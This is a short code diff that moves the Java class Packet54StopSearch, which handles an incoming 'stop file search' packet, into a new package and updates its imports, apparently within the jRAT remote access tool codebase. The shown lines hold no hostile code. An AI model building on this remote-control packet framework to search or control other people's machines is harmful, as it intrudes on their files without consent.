@@ -1,7 +1,8 @@
-package jrat.client.packets.incoming;
+package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.FileSearch;
+import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.module.fs.FileSearch;
 
 public class Packet54StopSearch extends AbstractIncomingPacket {
 
